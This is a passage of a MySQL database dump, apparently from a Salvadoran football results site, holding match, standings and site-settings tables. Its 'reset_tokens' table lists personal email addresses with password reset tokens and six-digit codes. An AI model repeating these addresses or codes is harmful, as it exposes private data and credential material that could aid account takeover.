  `fase` enum('grupos','octavos','cuartos','semis','final') DEFAULT 'grupos',
  `llave` int(11) DEFAULT NULL,
  `grupo_copa` char(1) DEFAULT NULL COMMENT 'Solo fase grupos: A-F',
  `jornada` varchar(10) DEFAULT NULL COMMENT 'ida/vuelta',
  `orden` int(11) NOT NULL DEFAULT 0,
  `penales_local` int(11) DEFAULT NULL,
  `penales_visitante` int(11) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_fase` (`fase`),
  KEY `idx_grupo` (`grupo_copa`),
  KEY `idx_estado` (`estado`),
  KEY `fk_copa_local` (`equipo_local_id`),
  KEY `fk_copa_visitante` (`equipo_visitante_id`),
  CONSTRAINT `fk_copa_local` FOREIGN KEY (`equipo_local_id`) REFERENCES `equipos_copa` (`id`) ON DELETE CASCADE,
  CONSTRAINT `fk_copa_visitante` FOREIGN KEY (`equipo_visitante_id`) REFERENCES `equipos_copa` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=698 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `partidos_copa`
--

LOCK TABLES `partidos_copa` WRITE;
/*!40000 ALTER TABLE `partidos_copa` DISABLE KEYS */;
INSERT INTO `partidos_copa` VALUES
(606,214,199,0,2,'2026-04-08','15:00:00','Finalizado','octavos',NULL,NULL,'ida',1,NULL,NULL,'2026-07-10 22:09:26','2026-07-15 13:38:04'),
(607,199,214,3,0,'2026-04-24','19:00:00','Finalizado','octavos',NULL,NULL,'vuelta',1,NULL,NULL,'2026-07-10 22:10:22','2026-07-15 13:38:04'),
(608,200,204,3,1,'2026-04-07','19:00:00','Finalizado','octavos',NULL,NULL,'ida',2,NULL,NULL,'2026-07-11 02:28:10','2026-07-15 13:38:04'),
(609,204,200,1,1,'2026-04-21','17:00:00','Finalizado','octavos',NULL,NULL,'vuelta',2,NULL,NULL,'2026-07-11 19:38:12','2026-07-15 13:38:04'),
(610,245,202,0,0,'2026-04-09','17:00:00','Finalizado','octavos',NULL,NULL,'ida',3,NULL,NULL,'2026-07-12 01:26:24','2026-07-15 13:38:04'),
(611,202,245,2,1,'2026-04-23','19:00:00','Finalizado','octavos',NULL,NULL,'vuelta',3,NULL,NULL,'2026-07-12 01:27:07','2026-07-15 13:38:04'),
(612,229,201,2,4,'2026-04-08','17:00:00','Finalizado','octavos',NULL,NULL,'ida',4,NULL,NULL,'2026-07-12 02:03:01','2026-07-15 13:44:13'),
(613,201,229,4,1,'2026-04-22','19:00:00','Finalizado','octavos',NULL,NULL,'vuelta',4,NULL,NULL,'2026-07-12 02:04:10','2026-07-15 13:44:13'),
(614,219,210,1,5,'2026-04-08','17:00:00','Finalizado','octavos',NULL,NULL,'ida',5,NULL,NULL,'2026-07-12 02:05:35','2026-07-15 13:44:16'),
(615,210,219,4,1,'2026-04-21','19:00:00','Finalizado','octavos',NULL,NULL,'vuelta',5,NULL,NULL,'2026-07-12 02:07:36','2026-07-15 13:44:16'),
(616,206,207,1,1,'2026-04-09','17:00:00','Finalizado','octavos',NULL,NULL,'ida',6,NULL,NULL,'2026-07-12 02:11:22','2026-07-15 13:44:19'),
(617,207,206,1,0,'2026-04-21','19:00:00','Finalizado','octavos',NULL,NULL,'vuelta',6,NULL,NULL,'2026-07-12 02:15:16','2026-07-15 13:44:19'),
(622,199,200,NULL,NULL,'2026-09-02','14:00:00','Pendiente','cuartos',NULL,NULL,'ida',1,NULL,NULL,'2026-07-12 02:25:53','2026-07-15 13:49:20'),
(623,205,203,NULL,NULL,'2026-09-09','14:00:00','Pendiente','cuartos',NULL,NULL,'ida',4,NULL,NULL,'2026-07-15 13:21:04','2026-07-15 13:50:25'),
(624,202,201,NULL,NULL,'2026-09-02','14:00:00','Pendiente','cuartos',NULL,NULL,'ida',2,NULL,NULL,'2026-07-15 13:49:48','2026-07-15 13:50:30'),
(625,210,207,NULL,NULL,'2026-09-02','14:00:00','Pendiente','cuartos',NULL,NULL,'ida',3,NULL,NULL,'2026-07-15 13:50:20','2026-07-15 13:50:30'),
(662,202,221,1,1,'2026-02-11','15:00:00','Finalizado','grupos',NULL,'A',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(663,206,234,3,1,'2026-02-11','15:00:00','Finalizado','grupos',NULL,'A',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(664,202,234,1,1,'2026-02-25','15:00:00','Finalizado','grupos',NULL,'A',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(665,206,221,0,0,'2026-02-25','15:00:00','Finalizado','grupos',NULL,'A',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(666,221,234,0,0,'2026-03-10','15:00:00','Finalizado','grupos',NULL,'A',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(667,202,206,2,1,'2026-03-11','15:00:00','Finalizado','grupos',NULL,'A',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(668,219,201,1,4,'2026-02-11','15:00:00','Finalizado','grupos',NULL,'B',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(669,251,207,0,3,'2026-02-12','15:00:00','Finalizado','grupos',NULL,'B',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(670,207,201,0,1,'2026-02-26','15:00:00','Finalizado','grupos',NULL,'B',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(671,251,219,0,1,'2026-02-26','15:00:00','Finalizado','grupos',NULL,'B',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(672,219,207,3,3,'2026-03-11','15:00:00','Finalizado','grupos',NULL,'B',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(673,201,251,2,0,'2026-03-12','15:00:00','Finalizado','grupos',NULL,'B',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(674,199,218,0,3,'2026-02-10','15:00:00','Finalizado','grupos',NULL,'C',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(675,205,245,4,1,'2026-02-11','15:00:00','Finalizado','grupos',NULL,'C',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(676,245,218,3,0,'2026-02-24','15:00:00','Finalizado','grupos',NULL,'C',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(677,205,199,0,1,'2026-02-25','15:00:00','Finalizado','grupos',NULL,'C',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(678,199,245,1,1,'2026-03-10','15:00:00','Finalizado','grupos',NULL,'C',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(679,205,218,3,0,'2026-03-11','15:00:00','Finalizado','grupos',NULL,'C',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(680,200,236,2,2,'2026-02-12','15:00:00','Finalizado','grupos',NULL,'D',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(682,200,214,1,0,'2026-02-24','15:00:00','Finalizado','grupos',NULL,'D',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(685,214,236,1,0,'2026-03-12','15:00:00','Finalizado','grupos',NULL,'D',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(686,229,211,2,0,'2026-02-10','15:00:00','Finalizado','grupos',NULL,'E',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(687,210,229,3,2,'2026-02-24','15:00:00','Finalizado','grupos',NULL,'E',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(689,210,211,2,0,'2026-03-10','15:00:00','Finalizado','grupos',NULL,'E',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(692,203,230,4,1,'2026-02-10','15:00:00','Finalizado','grupos',NULL,'F',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(693,204,212,2,0,'2026-02-12','15:00:00','Finalizado','grupos',NULL,'F',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(694,212,230,2,0,'2026-02-24','15:00:00','Finalizado','grupos',NULL,'F',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(695,204,203,1,1,'2026-02-26','15:00:00','Finalizado','grupos',NULL,'F',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(696,204,230,1,0,'2026-03-10','15:00:00','Finalizado','grupos',NULL,'F',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06'),
(697,203,212,3,1,'2026-03-11','15:00:00','Finalizado','grupos',NULL,'F',NULL,0,NULL,NULL,'2026-07-19 08:36:06','2026-07-19 08:36:06');
/*!40000 ALTER TABLE `partidos_copa` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `partidos_femenina`
--

DROP TABLE IF EXISTS `partidos_femenina`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `partidos_femenina` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_local` int(11) DEFAULT NULL,
  `equipo_visitante` int(11) DEFAULT NULL,
  `goles_local` int(11) DEFAULT 0,
  `goles_visitante` int(11) DEFAULT 0,
  `jugado` tinyint(1) DEFAULT 0,
  `fecha` datetime DEFAULT NULL,
  `jornada` int(11) DEFAULT NULL,
  `hora` time DEFAULT NULL,
  `estado` varchar(20) DEFAULT 'Pendiente',
  `featured` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1014 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `partidos_femenina`
--

LOCK TABLES `partidos_femenina` WRITE;
/*!40000 ALTER TABLE `partidos_femenina` DISABLE KEYS */;
INSERT INTO `partidos_femenina` VALUES
(1001,6,5,2,0,0,'2026-07-24 15:00:00',1,NULL,'Finalizado',0),
(1002,11,12,1,1,0,'2026-07-25 14:30:00',1,NULL,'Finalizado',0),
(1004,3,4,5,0,0,'2026-07-25 14:30:00',1,NULL,'Finalizado',0),
(1005,2,10,1,2,0,'2026-07-25 15:30:00',1,NULL,'Finalizado',0),
(1006,13,7,0,10,0,'2026-07-26 15:00:00',1,NULL,'Finalizado',0),
(1007,9,1,0,0,0,'2026-07-26 18:00:00',1,NULL,'Pendiente',0),
(1008,6,13,2,1,0,'2026-07-28 12:30:00',2,NULL,'Finalizado',0),
(1009,4,9,1,4,0,'2026-07-28 15:00:00',2,NULL,'Finalizado',0),
(1010,10,11,0,4,0,'2026-07-28 15:30:00',2,NULL,'Finalizado',0),
(1011,5,3,0,1,0,'2026-07-29 16:00:00',2,NULL,'Finalizado',0),
(1012,7,2,2,0,0,'2026-07-29 18:00:00',2,NULL,'Finalizado',0),
(1013,12,1,0,0,0,'2026-07-29 03:24:39',2,NULL,'Pendiente',0);
/*!40000 ALTER TABLE `partidos_femenina` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `partidos_reservas`
--

DROP TABLE IF EXISTS `partidos_reservas`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `partidos_reservas` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_local` int(11) DEFAULT NULL,
  `equipo_visitante` int(11) DEFAULT NULL,
  `goles_local` int(11) DEFAULT 0,
  `goles_visitante` int(11) DEFAULT 0,
  `fecha` datetime DEFAULT NULL,
  `hora` time DEFAULT NULL,
  `jornada` int(11) DEFAULT NULL,
  `estado` varchar(20) DEFAULT 'Pendiente',
  `featured` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `partidos_reservas`
--

LOCK TABLES `partidos_reservas` WRITE;
/*!40000 ALTER TABLE `partidos_reservas` DISABLE KEYS */;
INSERT INTO `partidos_reservas` VALUES
(3,190,184,4,1,'2026-07-25 11:00:00',NULL,1,'Finalizado',0),
(4,191,185,2,5,'2026-07-25 11:00:00',NULL,1,'Finalizado',0),
(5,187,186,1,2,'2026-07-25 12:00:00',NULL,1,'Finalizado',0),
(6,183,181,2,1,'2026-07-26 12:00:00',NULL,1,'Finalizado',1),
(7,189,188,3,1,'2026-07-26 12:00:00',NULL,1,'Finalizado',0),
(8,192,182,1,2,'2026-07-26 12:00:00',NULL,1,'Finalizado',0),
(9,184,192,2,4,'2026-07-29 11:00:00',NULL,2,'Finalizado',0),
(10,188,182,3,2,'2026-07-29 12:30:00',NULL,2,'Finalizado',0),
(11,181,189,0,0,'2026-07-29 15:00:00',NULL,2,'Finalizado',0),
(12,187,191,1,1,'2026-07-29 15:00:00',NULL,2,'Finalizado',0),
(13,186,190,4,0,'2026-07-30 14:00:00',NULL,2,'Finalizado',0),
(14,185,183,2,3,'2026-07-30 15:00:00',NULL,2,'Finalizado',0);
/*!40000 ALTER TABLE `partidos_reservas` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `partidos_segunda`
--

DROP TABLE IF EXISTS `partidos_segunda`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `partidos_segunda` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `local_id` int(11) DEFAULT NULL,
  `visitante_id` int(11) DEFAULT NULL,
  `goles_local` int(11) DEFAULT 0,
  `goles_visitante` int(11) DEFAULT 0,
  `fecha` date DEFAULT NULL,
  `hora` time DEFAULT NULL,
  `status` varchar(20) DEFAULT 'Pendiente',
  `featured` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `partidos_segunda`
--

LOCK TABLES `partidos_segunda` WRITE;
/*!40000 ALTER TABLE `partidos_segunda` DISABLE KEYS */;
/*!40000 ALTER TABLE `partidos_segunda` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `partidos_seleccion`
--

DROP TABLE IF EXISTS `partidos_seleccion`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `partidos_seleccion` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `rival_nombre` varchar(150) NOT NULL,
  `rival_logo` varchar(255) DEFAULT NULL,
  `goles_favor` int(11) DEFAULT NULL,
  `goles_contra` int(11) DEFAULT NULL,
  `fecha` date DEFAULT NULL,
  `hora` time DEFAULT NULL,
  `estado` varchar(50) DEFAULT 'Pendiente',
  `competicion` varchar(100) DEFAULT NULL,
  `lugar` varchar(50) DEFAULT 'Neutral',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `partidos_seleccion`
--

LOCK TABLES `partidos_seleccion` WRITE;
/*!40000 ALTER TABLE `partidos_seleccion` DISABLE KEYS */;
/*!40000 ALTER TABLE `partidos_seleccion` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `partidos_seleccion_femenina`
--

DROP TABLE IF EXISTS `partidos_seleccion_femenina`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `partidos_seleccion_femenina` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `rival_nombre` varchar(150) NOT NULL,
  `rival_logo` varchar(255) DEFAULT NULL,
  `goles_favor` int(11) DEFAULT NULL,
  `goles_contra` int(11) DEFAULT NULL,
  `fecha` date DEFAULT NULL,
  `hora` time DEFAULT NULL,
  `estado` varchar(50) DEFAULT 'Pendiente',
  `competicion` varchar(100) DEFAULT NULL,
  `lugar` varchar(50) DEFAULT 'Neutral',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `partidos_seleccion_femenina`
--

LOCK TABLES `partidos_seleccion_femenina` WRITE;
/*!40000 ALTER TABLE `partidos_seleccion_femenina` DISABLE KEYS */;
/*!40000 ALTER TABLE `partidos_seleccion_femenina` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `partidos_seleccion_sub17`
--

DROP TABLE IF EXISTS `partidos_seleccion_sub17`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `partidos_seleccion_sub17` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `rival_nombre` varchar(150) NOT NULL,
  `rival_logo` varchar(255) DEFAULT NULL,
  `goles_favor` int(11) DEFAULT NULL,
  `goles_contra` int(11) DEFAULT NULL,
  `fecha` date DEFAULT NULL,
  `hora` time DEFAULT NULL,
  `estado` varchar(50) DEFAULT 'Pendiente',
  `competicion` varchar(100) DEFAULT NULL,
  `lugar` varchar(50) DEFAULT 'Neutral',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `partidos_seleccion_sub17`
--

LOCK TABLES `partidos_seleccion_sub17` WRITE;
/*!40000 ALTER TABLE `partidos_seleccion_sub17` DISABLE KEYS */;
/*!40000 ALTER TABLE `partidos_seleccion_sub17` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `partidos_seleccion_sub20`
--

DROP TABLE IF EXISTS `partidos_seleccion_sub20`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `partidos_seleccion_sub20` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `rival_nombre` varchar(150) NOT NULL,
  `rival_logo` varchar(255) DEFAULT NULL,
  `goles_favor` int(11) DEFAULT NULL,
  `goles_contra` int(11) DEFAULT NULL,
  `fecha` date DEFAULT NULL,
  `hora` time DEFAULT NULL,
  `estado` varchar(50) DEFAULT 'Pendiente',
  `competicion` varchar(100) DEFAULT NULL,
  `lugar` varchar(50) DEFAULT 'Neutral',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `partidos_seleccion_sub20`
--

LOCK TABLES `partidos_seleccion_sub20` WRITE;
/*!40000 ALTER TABLE `partidos_seleccion_sub20` DISABLE KEYS */;
INSERT INTO `partidos_seleccion_sub20` VALUES
(1,'Cuba','https://upload.wikimedia.org/wikipedia/en/a/a7/Cuba_national_football_team.png',0,3,'2026-07-25','17:00:00','Finalizado','Otro','Visitante','2026-07-26 07:06:48');
/*!40000 ALTER TABLE `partidos_seleccion_sub20` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `partidos_tercera`
--

DROP TABLE IF EXISTS `partidos_tercera`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `partidos_tercera` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `local_id` int(11) DEFAULT NULL,
  `visitante_id` int(11) DEFAULT NULL,
  `goles_local` int(11) DEFAULT 0,
  `goles_visitante` int(11) DEFAULT 0,
  `fecha` date DEFAULT NULL,
  `hora` time DEFAULT NULL,
  `status` varchar(20) DEFAULT 'Pendiente',
  `featured` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `partidos_tercera`
--

LOCK TABLES `partidos_tercera` WRITE;
/*!40000 ALTER TABLE `partidos_tercera` DISABLE KEYS */;
/*!40000 ALTER TABLE `partidos_tercera` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `reset_tokens`
--

DROP TABLE IF EXISTS `reset_tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `reset_tokens` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(100) NOT NULL,
  `token` varchar(64) NOT NULL,
  `codigo` varchar(6) NOT NULL,
  `creado_en` timestamp NOT NULL DEFAULT current_timestamp(),
  `expira_en` timestamp NOT NULL DEFAULT (current_timestamp() + interval 15 minute),
  `usado` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`),
  KEY `idx_token` (`token`),
  KEY `idx_email` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=40 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `reset_tokens`
--

LOCK TABLES `reset_tokens` WRITE;
/*!40000 ALTER TABLE `reset_tokens` DISABLE KEYS */;
INSERT INTO `reset_tokens` VALUES
(30,'admin@numerosyfutbol.com','104c0342196d2586ea8dd762de5763177113c02a81d7880efc1224e4dd3e9dd0','870622','2026-07-24 15:18:08','2026-07-24 15:33:08',0),
(33,'info2026@gmail.com','9f7bcdfc2bca5444d376c120b414609ea7f45530b4c8814be34cc40b1697fe48','607920','2026-07-28 16:58:34','2026-07-28 17:13:34',0),
(34,'unmaje@gmail.com','f22dce5465e8f52a575c1ee89905b043a2d6dcc30ac3fd1ee1fdfc7e36e4ec9f','559993','2026-07-28 16:59:29','2026-07-28 17:14:29',0),
(35,'arielosotomayor0411@gmail.com','1bdaba98b93bf51ef4d4ae13dc94461d8bf1acaac81aa152e21e0e7205c7346c','733489','2026-07-29 02:42:14','2026-07-29 02:57:14',1),
(39,'vanesotomayor0411@gmail.com','54f28428cb69d1f37fa20d27ccd3c8222ab77bfd487f6a8bced6ac9bef926c08','229846','2026-07-31 15:55:12','2026-07-31 16:10:12',1);
/*!40000 ALTER TABLE `reset_tokens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `site_settings`
--

DROP TABLE IF EXISTS `site_settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `site_settings` (
  `key` varchar(100) NOT NULL,
  `value` text DEFAULT NULL,
  PRIMARY KEY (`key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `site_settings`
--

LOCK TABLES `site_settings` WRITE;
/*!40000 ALTER TABLE `site_settings` DISABLE KEYS */;
INSERT INTO `site_settings` VALUES
('contact_email','contacto@numerosyfutbol.com'),
('facebook_url','https://www.facebook.com/numerosyfutbol'),
('hero_banner_url','/backend/uploads/banner_6a6c3bb83f694.jpg'),
('hero_btn1_label','Últimas Noticias'),
('hero_btn1_link','/news'),
('hero_btn2_label','Ver Resultados'),
('hero_btn2_link','/primera'),
('hero_description','Cobertura completa de todas las divisiones. Noticias, resultados y análisis del mejor fútbol salvadoreño en vivo.'),
('hero_title','Noticias y numeros que genera el fútbol'),
('instagram_url','https://www.instagram.com/numerosyfutbol/'),
('maintenance_mode','0'),
('maintenance_msg','Volvemos pronto'),
('site_description',''),
('site_logo_url','/backend/uploads/6a6c396f8b79e.jpg'),
('site_name','Números Y Fútbol'),
('twitter_url','');
/*!40000 ALTER TABLE `site_settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tabla_posiciones`
--

DROP TABLE IF EXISTS `tabla_posiciones`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `tabla_posiciones` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_id` int(11) NOT NULL,
  `partidos_jugados` int(11) NOT NULL DEFAULT 0,
  `ganados` int(11) NOT NULL DEFAULT 0,
  `empatados` int(11) NOT NULL DEFAULT 0,
  `perdidos` int(11) NOT NULL DEFAULT 0,
  `goles_favor` int(11) NOT NULL DEFAULT 0,
  `goles_contra` int(11) NOT NULL DEFAULT 0,
  `puntos` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_equipo_unico` (`equipo_id`),
  KEY `equipo_id` (`equipo_id`)
) ENGINE=InnoDB AUTO_INCREMENT=547 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tabla_posiciones`
--

LOCK TABLES `tabla_posiciones` WRITE;
/*!40000 ALTER TABLE `tabla_posiciones` DISABLE KEYS */;
INSERT INTO `tabla_posiciones` VALUES
(14,4,2,1,1,0,5,1,4),
(17,5,1,1,0,0,3,1,3),
(18,6,2,0,2,0,1,1,2),
(21,7,2,1,0,1,3,3,3),
(22,8,2,0,2,0,0,0,2),
(23,9,2,2,0,0,6,2,6),
(61,10,2,1,0,1,6,6,3),
(74,11,1,0,1,0,1,1,1),
(75,12,2,0,1,1,1,5,1),
(384,15,2,1,0,1,3,3,3),
(543,17,2,0,1,1,2,4,1),
(544,18,2,0,0,2,1,5,0);
/*!40000 ALTER TABLE `tabla_posiciones` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tabla_posiciones_ascenso`
--

DROP TABLE IF EXISTS `tabla_posiciones_ascenso`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `tabla_posiciones_ascenso` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_id` int(11) NOT NULL,
  `pj` int(11) NOT NULL DEFAULT 0,
  `pg` int(11) NOT NULL DEFAULT 0,
  `pe` int(11) NOT NULL DEFAULT 0,
  `pp` int(11) NOT NULL DEFAULT 0,
  `gf` int(11) NOT NULL DEFAULT 0,
  `gc` int(11) NOT NULL DEFAULT 0,
  `dg` int(11) NOT NULL DEFAULT 0,
  `pts` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`),
  UNIQUE KEY `equipo_id` (`equipo_id`)
) ENGINE=InnoDB AUTO_INCREMENT=51 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tabla_posiciones_ascenso`
--

LOCK TABLES `tabla_posiciones_ascenso` WRITE;
/*!40000 ALTER TABLE `tabla_posiciones_ascenso` DISABLE KEYS */;
INSERT INTO `tabla_posiciones_ascenso` VALUES
(1,1,0,0,0,0,0,0,0,0),
(3,3,0,0,0,0,0,0,0,0),
(9,9,0,0,0,0,0,0,0,0),
(11,11,0,0,0,0,0,0,0,0),
(12,12,0,0,0,0,0,0,0,0),
(14,14,0,0,0,0,0,0,0,0),
(19,19,0,0,0,0,0,0,0,0),
(20,20,0,0,0,0,0,0,0,0),
(22,22,0,0,0,0,0,0,0,0),
(23,23,0,0,0,0,0,0,0,0),
(24,24,0,0,0,0,0,0,0,0),
(26,26,0,0,0,0,0,0,0,0),
(30,30,0,0,0,0,0,0,0,0),
(33,33,0,0,0,0,0,0,0,0),
(34,34,0,0,0,0,0,0,0,0),
(35,35,0,0,0,0,0,0,0,0),
(36,36,0,0,0,0,0,0,0,0),
(37,37,0,0,0,0,0,0,0,0),
(38,38,0,0,0,0,0,0,0,0),
(39,39,0,0,0,0,0,0,0,0),
(47,47,0,0,0,0,0,0,0,0),
(48,48,0,0,0,0,0,0,0,0),
(49,49,0,0,0,0,0,0,0,0),
(50,50,0,0,0,0,0,0,0,0);
/*!40000 ALTER TABLE `tabla_posiciones_ascenso` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tabla_posiciones_burgerking`
--

DROP TABLE IF EXISTS `tabla_posiciones_burgerking`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `tabla_posiciones_burgerking` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_id` int(11) NOT NULL,
  `partidos_jugados` int(11) NOT NULL DEFAULT 0,
  `ganados` int(11) NOT NULL DEFAULT 0,
  `empatados` int(11) NOT NULL DEFAULT 0,
  `perdidos` int(11) NOT NULL DEFAULT 0,
